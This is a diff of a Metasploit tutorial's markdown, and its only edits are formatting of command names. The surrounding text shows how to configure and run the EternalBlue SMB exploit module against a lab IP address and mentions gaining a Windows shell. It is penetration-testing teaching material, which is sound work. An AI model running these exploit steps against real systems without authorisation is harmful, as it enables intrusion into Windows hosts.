@@ -546,7 +546,7 @@ A shell on the target system: Once the exploit is completed, you may have access
 ```
 C:\Windows\system32>
 ```
-As mentioned earlier, the show options command will list all available parameters.
+As mentioned earlier, the `show options` command will list all available parameters.
 ```
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
 
@@ -582,7 +582,7 @@ Exploit target:
 msf6 exploit(windows/smb/ms17_010_eternalblue) >
 ```
 As you can see in the screenshot above, some of these parameters require a value for the exploit to work. Some required parameter values will be pre-populated, make sure you check if these should remain the same for your target. For example, a web exploit could have an RPORT (remote port: the port on the target system Metasploit will try to connect to and run the exploit) value preset to 80, but your target web application could be using port 8080.  
-In this example, we will set the RHOSTS parameter to the IP address of our target system using the set command.
+In this example, we will set the RHOSTS parameter to the IP address of our target system using the `set` command.
 ```
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
 rhosts => 10.10.165.39
